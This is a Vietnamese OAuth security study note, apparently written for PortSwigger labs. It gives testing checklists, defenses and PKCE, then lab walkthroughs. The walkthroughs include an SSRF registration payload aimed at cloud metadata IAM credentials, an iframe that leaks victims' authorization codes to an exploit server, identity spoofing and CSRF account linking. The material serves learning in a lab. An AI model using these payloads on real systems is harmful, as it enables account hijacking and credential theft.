- Có Referer leak không?
- Có open redirect chain không?
- Có log/analytics ghi URL callback không?


### Kiểm tra scope

Thử:

- Tăng scope.
- Giảm scope.
- Dùng token scope thấp gọi API scope cao.
- Dùng token cấp cho client khác.
- Kiểm tra provider có hỏi consent lại khi scope thay đổi không.

---

### Kiểm tra OpenID Connect

Tìm:

```text
scope=openid
id_token
nonce
/.well-known/openid-configuration
jwks_uri
registration_endpoint
request_uri_parameter_supported
```

Kiểm tra ID token:

- Signature có được verify không?
- `iss` có đúng provider không?
- `aud` có đúng client_id không?
- `exp` còn hạn không?
- `nonce` có khớp không?
- `email_verified` có được kiểm tra không?


## Cách phòng chống OAuth vulnerabilities

**Với OAuth service provider**

Nên làm:

```text
1. Yêu cầu client đăng ký whitelist redirect_uri hợp lệ.
2. So sánh redirect_uri chính xác tuyệt đối, tránh pattern matching lỏng.
3. Không cho redirect_uri tùy ý.
4. Bắt buộc kiểm tra client_id.
5. Ràng buộc authorization code với client_id và redirect_uri.
6. Kiểm tra access token thuộc đúng client_id.
7. Kiểm tra scope ở resource server.
8. Yêu cầu state hoặc hỗ trợ cơ chế chống CSRF rõ ràng.
9. Không cấp scope cao nếu user chưa consent.
10. Với dynamic client registration, yêu cầu authentication và validate metadata kỹ.
```

Đặc biệt với `redirect_uri`:

> Nên whitelist URI đầy đủ và so sánh chính xác từng byte, thay vì chỉ so khớp domain một cách lỏng lẻo.

---

**Với client application**

```text
1. Hiểu đúng OAuth flow trước khi triển khai.
2. Luôn dùng state cho OAuth request.
3. Ràng buộc state với session user.
4. Gửi redirect_uri trong cả authorization request và token request nếu provider hỗ trợ/yêu cầu.
5. Không tin dữ liệu user do browser gửi lên.
6. Luôn xác minh token với OAuth provider hoặc validate ID token đúng cách.
7. Không chỉ dựa vào email nếu email chưa verified.
8. Dùng sub + iss để định danh user ổn định.
9. Không để code/token lộ qua Referer, JavaScript, logs, URL ngoài.
10. Dùng Authorization Code Grant thay vì Implicit Grant nếu có backend.
11. Dùng PKCE cho public clients, mobile apps, native apps, SPA hiện đại.
12. Nếu dùng OpenID Connect id_token, validate chữ ký, issuer, audience, expiry, nonce.
```


**PKCE** là cơ chế tăng bảo mật cho Authorization Code Flow, đặc biệt với public client không giữ được `client_secret` an toàn.

Ý tưởng đơn giản:

```text
Client tạo code_verifier bí mật.
Client gửi code_challenge trong authorization request.
Khi đổi code lấy token, client phải gửi lại code_verifier.
Provider kiểm tra code_verifier có khớp code_challenge không.
```

PKCE giúp giảm nguy cơ attacker dùng authorization code bị đánh cắp để đổi lấy access token.

---

## Tóm tắt nhanh để nhớ

OAuth authentication là:

```text
Dùng tài khoản ở OAuth provider để đăng nhập vào client app.
```

Nhưng OAuth gốc là:

```text
Cơ chế ủy quyền truy cập tài nguyên, không phải cơ chế đăng nhập hoàn chỉnh.
```

Các thành phần chính:

```text
Resource owner       = User
Client application   = Website/app muốn truy cập dữ liệu
OAuth provider       = Google/Facebook/GitHub...
Authorization server = Nơi cấp code/token
Resource server      = Nơi chứa API dữ liệu user
```

Hai flow quan trọng:

```text
Authorization Code Grant: response_type=code, an toàn hơn, token qua backend.
Implicit Grant: response_type=token, token qua browser, rủi ro hơn.
```

Tham số cần nhớ:

```text
client_id
redirect_uri
response_type
scope
state
nonce
code
access_token
id_token
```

Các lỗi chính:

```text
1. Server tin dữ liệu từ browser trong implicit flow.
2. Thiếu hoặc validate sai state.
3. Code/token bị leak qua redirect_uri, open redirect, Referer.
4. Scope validation yếu.
5. Tin email chưa verified.
6. Validate id_token sai trong OpenID Connect.
7. Dynamic client registration không bảo vệ.
8. request_uri gây SSRF hoặc bypass validation.
```

# WU
- [x] Authentication bypass via OAuth implicit flow
- [x] Forced OAuth profile linking
- [x] OAuth account hijacking via redirect_uri
- [ ] Stealing OAuth access tokens via an open redirect
- [x] SSRF via OpenID dynamic client registration
- [ ] Stealing OAuth access tokens via a proxy page

## Authentication bypass via OAuth implicit flow

 - mục tiêu là login vào tài khoản carlos có email là `carlos@carlos-montoya.net`
flow bình thường:
```
1. User bấm Login with social media.
2. Trình duyệt chuyển sang OAuth provider.
3. User đăng nhập bằng tài khoản social.
4. OAuth provider trả access token về trình duyệt.
5. Trình duyệt gửi thông tin user về website chính.
6. Website chính tạo session đăng nhập.
```
- khi login bằng wiener:peter qua social media, ở burp ta thấy các request liên quan tới oauth, trong đó có request authorization
![](../../image/Pasted%20image%2020260515104905.png)

có response type=token => server sử dụng implicit flow, vì trong implicit flow, access token được trả về thông qua trình duyệt. Vì token và thông tin user đi qua phía client, nếu server xử lý không chặt thì attacker có thể sửa dữ liệu trước khi gửi về server.

- tiếp theo ta thấy request
![](../../image/Pasted%20image%2020260515105257.png)
Request `/authenticate` là nơi client application gửi thông tin OAuth user về server để tạo phiên đăng nhập. Nếu server tin trường `email` trong request này mà không kiểm tra token tương ứng với email, ta có thể giả mạo danh tính

- chuyển request sang repeater và sửa thành email của carlos sau đó send
![](../../image/Pasted%20image%2020260515105417.png)

- để lab cập nhật trạng thái trong trình duyệt, ta dùng chức năng “Request in browser” để thực hiện lại request trong session gốc của browse

## SSRF via openID dynamic client registration
Lab yêu cầu khai thác **SSRF** thông qua chức năng **OpenID dynamic client registration**.
Mục tiêu cuối cùng là truy cập URL metadata nội bộ:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
```
Sau đó lấy giá trị:`SecretAccessKey`và submit

- OpenID dynamic client registration là gì?
Trong OpenID Connect, một client application có thể đăng ký với OAuth/OpenID provider.
Ví dụ app gửi request đăng ký:
```
POST /reg HTTP/1.1Host: oauth-server.netContent-Type: application/json{  "redirect_uris": [    "https://example.com/callback"  ],  "logo_uri": "https://example.com/logo.png"}
```

| Trường          | Ý nghĩa                                  |
| --------------- | ---------------------------------------- |
| `redirect_uris` | Danh sách callback URL hợp lệ của client |
| `logo_uri`      | URL logo của client application          |
| `client_id`     | ID được provider cấp sau khi đăng ký     |

- kih login bằng tài khoản wiener:peter, ở burp quan sát các request thấy tên miền của oAuth
![](../../image/Pasted%20image%2020260515112156.png)
Đây là **OAuth/OpenID provider** của lab.
Client application và OAuth provider là hai hệ thống khác nhau. Lỗ hổng SSRF nằm ở OAuth provider, nên ta cần xác định đúng domain của provider.
- truy cập đường dẫn: OpenID Connect thường công khai file `.well-known/openid-configuration` để client biết các endpoint như authorization endpoint, token endpoint, userinfo endpoint và registration endpoint. Ở đây, endpoint `/reg` cho phép đăng ký client động.
![](../../image/Pasted%20image%2020260515113016.png)
ở repeater:
```
POST /reg HTTP/2
Host: oauth-0ae8006804d4313780f76a3402eb0027.oauth-server.net
Content-Type: application/json
Content-Length: 67

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
Request này chứng minh OAuth provider cho phép dynamic client registration mà không yêu cầu authentication. Đây là điều kiện đầu tiên để attacker tự tạo client độc hại
![](../../image/Pasted%20image%2020260515113315.png)


gửi Request này dùng để **đăng ký một OAuth/OpenID client mới** với OAuth server
![](../../image/Pasted%20image%2020260515140336.png)
`POST /reg`
Đây là endpoint **dynamic client registration**.

Thông thường, một OAuth provider an toàn không nên cho ai cũng tự đăng ký client như vậy nếu không kiểm soát.
`edirect_uris`

```
"redirect_uris": [  "https://example.com"]
```

Đây là URL callback của client.

Trong lab này, trường này chỉ cần có để request hợp lệ. Ta không khai thác qua `redirect_uris`, nên để tạm là:

```
https://example.com
```
`logo_uri`

```
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
```

Đây là phần quan trọng nhất.
Bình thường `logo_uri` dùng để khai báo logo của client, ví dụ:
```
"logo_uri": "https://example.com/logo.png"
```
OAuth server sẽ dùng URL này để lấy logo và hiển thị trong trang consent/login.
Nhưng ở đây ta cố tình đặt `logo_uri` thành địa chỉ nội bộ:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```
Đây là địa chỉ metadata service nội bộ trong môi trường cloud.
Nói đơn giản:
```
Ta không bắt trình duyệt của mình truy cập 169.254.169.254.Ta bắt OAuth server truy cập 169.254.169.254 giúp ta.
```
Đây chính là SSRF.

sau đó gửi request để gọi endpoint lấy logo
![](../../image/Pasted%20image%2020260515135857.png)
khi server nhận request:
```
GET /client/client-id/logo
```
nó sẽ làm như sau:
```
1. Tìm client có id là client-id.
2. Xem client này có logo_uri là gì.
3. Thấy logo_uri là:   http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
4. OAuth server tự gửi request đến URL đó.
5. Metadata service trả về IAM credentials.
6. OAuth server trả nội dung đó lại cho mình qua response.
```
Tức là ta không truy cập trực tiếp metadata service mà đang dùng OAuth server làm “người trung gian” để truy cập.

## Forced OAuth profile linking
- login bằng tài khoản wiener:peter
![](../../image/Pasted%20image%2020260515141035.png)
- sau khi link với tài khoản social media thì dòng social username sẽ hiển thị: ![](../../image/Pasted%20image%2020260515141426.png)
- giờ ta cần chặn request trước khi hoàn tất Oauth
Chức năng này dùng OAuth để liên kết tài khoản hiện tại với một tài khoản social. Nếu luồng liên kết thiếu kiểm tra CSRF, attacker có thể ép victim liên kết tài khoản social của attacker
- drop request chứa auth code của social account attacker, vì nếu forward, code này sẽ được dùng để link social account vào tài khoản wiener, khi đó code ko thể dùng để ép victim nữa

![](../../image/Pasted%20image%2020260517042307.png)

oauth-linking?code=PEz1ZpqIP5eRxdYyFIE4zx_8QupjceBelUqUqfN4ua8 
copy mã code này để làm payload csrf cho victim
![](../../image/Pasted%20image%2020260517042519.png)

- do endpoint ko có tham số state, victim chỉ cần truy cập url callback chứa code của attacker là server sẽ xử lí code này trong session hiện tại của victim, kết quả là socail account của âttacker bị liên kết vào tài khoản victim
- khi ta logout và login lại bằng social account thì ta vào duojcd tragn admin panel

![](../../image/Pasted%20image%2020260517042626.png)
## OAuth account hijacking via redirect_uri
- Mục tiêu là **chiếm phiên đăng nhập của victim/admin** bằng cách lợi dụng tham số redirect_uri
- Nếu OAuth server cho phép attacker thay đổi redirect_uri, authorization code của victim có thể bị gửi về server của attacker.

	login vào tài khoản wierner:peter qua social media, ở burp tìm request gửi tới Oauth server
![](../../image/Pasted%20image%2020260515145817.png)
`response_type=code` cho biết lab dùng Authorization Code Flow. Nếu `redirect_uri` bị kiểm tra lỏng, attacker có thể khiến OAuth server gửi authorization code về domain do attacker kiểm soát.

- gửi request sang repeater và sửa redirect uri thành url của exploit server
- gửi request:
![](../../image/Pasted%20image%2020260517044316.png)
response redirect về url của exploit server và không báo lỗi `Invalid redirect_uri`, nghĩa là tham số này có thể bị thay đổi.
ta cần tạo một URL OAuth authorization có `redirect_uri` trỏ về exploit server

- trong repeater ấn follow redirection
![](../../image/Pasted%20image%2020260517044521.png)
=> khi redirect được thực hiện thì auth code thật sự gửi đến exploit server và xuất hiện trong access log
![](../../image/Pasted%20image%2020260517045128.png)


- đi vào khai thác, giờ tại exploit lấy code của victim
```
<iframe src="https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
- thay các giá trị id của lab và exploit server vào, sau đó store và deliver to victim, khi vào access log, iframe tự động gọi authorization endpoint, Oauth server cáp code và redirect về exploit server.

![](../../image/Pasted%20image%2020260517045940.png)

- nhớ logout ra trước, sau đó dùng mã code leak để vào trang admin
`https://LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN_CODE`
![](../../image/Pasted%20image%2020260517045925.png)
## Stealing OAuth access tokens via an open redirect
- mục tiêu là đánh cắp Oauth access token của admin, sau đó dùng token để gọi endpoint /me của Oauth server để lấy API key của admin
![](../../image/Pasted%20image%2020260517051213.png)
- sau khi login bằng tài khoản wiener:peter qua social media, thấy request Oauth auth có response_type = token => lab dùng implicit flow, access token sẽ đc trả về qua browser
- thử đổi redirect uri sang exploit server thì ko được
-=> cần tìm cách redirect về 1 path trên chính blog domain trước, rồi từ đó redirect tiếp ra exploit server
- ở các blog có chức năng next post
![](../../image/Pasted%20image%2020260517052030.png)
- đổi path sang url thì sercer vẫn tra về 302
![](../../image/Pasted%20image%2020260517052224.png)

=> đây là open redirect, endpoint cho phép url ngoài
